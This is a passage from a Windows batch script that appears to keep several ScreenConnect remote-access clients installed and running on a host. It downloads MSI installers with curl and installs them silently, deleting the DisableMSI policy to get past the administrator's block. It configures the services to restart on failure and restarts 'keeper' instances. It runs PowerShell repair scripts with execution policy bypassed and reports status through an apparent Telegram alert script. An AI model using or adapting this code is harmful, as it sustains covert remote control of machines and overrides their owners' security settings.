  "%CURL%" -L --connect-timeout 25 --max-time 300 -o "%MSI_G%.tmp" "%MSI_GRYXA%" >>"%LOG%" 2>&1
  for %%F in ("%MSI_G%.tmp") do if %%~zF GTR 1000000 (
    move /y "%MSI_G%.tmp" "%MSI_G%" >nul 2>&1
    copy /y "%MSI_G%" "%MSICACHE_G%" >nul 2>&1
    set "G_MSI_READY=1"
  )
  del /f /q "%MSI_G%.tmp" >nul 2>&1
)
if "%G_MSI_READY%"=="1" (
  call :NoMsiPolicy
  msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa.log" >>"%LOG%" 2>&1
  set "GEXIT=!ERRORLEVEL!"
  echo gryxa_msiexec_exit=!GEXIT!>>"%LOG%"
  if "!GEXIT!"=="1618" (
    timeout /t 30 /nobreak >nul
    msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa2.log" >>"%LOG%" 2>&1
    set "GEXIT=!ERRORLEVEL!"
    echo gryxa_msiexec_retry1618=!GEXIT!>>"%LOG%"
  )
  if "!GEXIT!"=="1618" (
    timeout /t 45 /nobreak >nul
    msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa3.log" >>"%LOG%" 2>&1
    set "GEXIT=!ERRORLEVEL!"
    echo gryxa_msiexec_retry1618b=!GEXIT!>>"%LOG%"
  )
  timeout /t 10 /nobreak >nul
) else (
  echo gryxa_msi_fetch_FAIL>>"%LOG%"
)

rem 5) post-install: repair if svc still missing, then force start
sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo gryxa_postinstall_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%GRYXA_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  timeout /t 6 /nobreak >nul
)
sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
sc failure "ScreenConnect Client (%GRYXA_FP%)" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1

rem msiexec of gryxa can disturb sevrz - nudge keepers back up
sc config "ScreenConnect Client (%KEEP_FP%)" start= auto >nul 2>&1
sc start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
sc config "ScreenConnect Client (%ALT_FP%)" start= auto >nul 2>&1
sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
call :RestoreAlt

sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  set "GRYXA_OK=1"
  echo gryxa_must_running_ok>>"%LOG%"
) else (
  set "GRYXA_OK=0"
  echo gryxa_must_still_down>>"%LOG%"
  sc query "ScreenConnect Client (%GRYXA_FP%)" >>"%LOG%" 2>&1
)
exit /b 0

:InstallMsi
rem %1=url %2=tag
set "URL=%~1"
set "TAG=%~2"
echo [%TAG%] fetch %URL%>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o "%MSI%.tmp" "%URL%" >>"%LOG%" 2>&1
for %%F in ("%MSI%.tmp") do if %%~zF LEQ 1000000 (
  echo [%TAG%] fetch failed>>"%LOG%"
  del /f /q "%MSI%.tmp" >nul 2>&1
  exit /b 1
)
move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
call :NoMsiPolicy
rem M13: stale primary dir (service deleted, product unregistered) breaks
rem the SC installer custom action - clear it before installing
sc query "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
if errorlevel 1 if exist "%PF86%\ScreenConnect Client (%KEEP_FP%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
)
echo [%TAG%] msiexec install>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
set "MSIEXIT=!ERRORLEVEL!"
echo [%TAG%] msiexec exit=!MSIEXIT!>>"%LOG%"
if "!MSIEXIT!"=="1618" (
  echo [%TAG%] msi_busy_retry>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal2.log" >nul 2>&1
  set "MSIEXIT=!ERRORLEVEL!"
  echo [%TAG%] msiexec_retry exit=!MSIEXIT!>>"%LOG%"
)
call :WaitSvc
call :RestoreAlt
rem O37: sevrz /i shares legacy UpgradeCodes with gryxa — always re-ensure Gryxa after
call :EnsureGryxaMust
exit /b 0
rem %1=fingerprint - service deleted but product registered: repair by GUID.
sc query "ScreenConnect Client (%~1)" >nul 2>&1
if not errorlevel 1 exit /b 0
if not exist "%WD%\own_lib.ps1" exit /b 1
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%~1" -WorkDir "%WD%" >>"%LOG%" 2>&1
call :WaitSvc
exit /b 0

:RestoreAlt
rem ALT service gone but still registered (SC-family msiexec side effect) - repair it too.
sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
if not errorlevel 1 exit /b 0
echo alt missing - repair attempt>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "ALT_OK=1"
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:WaitSvc
set "TRIES=0"
:WaitLoop
sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  set "INSTALLED=1"
  set "PRIM_OK=1"
  exit /b 0
)
set /a TRIES+=1
if %TRIES% GEQ 10 exit /b 1
ping 127.0.0.1 -n 7 >nul 2>&1
goto :WaitLoop

:TgState
set "NEWSTATE=%~1"
set "MSG=%~2"
set "OLDSTATE="
if exist "%STATE%" set /p OLDSTATE=<"%STATE%"
rem false DOWN after reboot race: primary already Running — do not spam
if /I "%NEWSTATE%"=="DOWN" (
  sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
  if not errorlevel 1 (
    echo tg_skip_down_already_running>>"%LOG%"
    exit /b 0
  )
)
rem rate-limit repeated DOWN/FAIL: max 1 alert per 6h while stuck
if /I "%NEWSTATE%"=="DOWN" goto :MaybeSuppress
if /I "%NEWSTATE%"=="FAIL" goto :MaybeSuppress
goto :SendAlert
:MaybeSuppress
if /I "%NEWSTATE%"=="%OLDSTATE%" if exist "%WD%\tg_sent.flag" (
  powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_sent.flag').LastWriteTime).TotalMinutes -lt 360){exit 0}else{exit 1}" >nul 2>&1
  if not errorlevel 1 (
    echo tg_suppressed_%NEWSTATE%>>"%LOG%"
    exit /b 0
  )
)
:SendAlert
echo %NEWSTATE%>"%STATE%"
echo sent>"%WD%\tg_sent.flag"
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State %NEWSTATE% -Summary "%MSG%" -Build %MONVER% -Count %COUNT% >nul 2>&1
echo tg state %NEWSTATE% sent>>"%LOG%"
exit /b 0
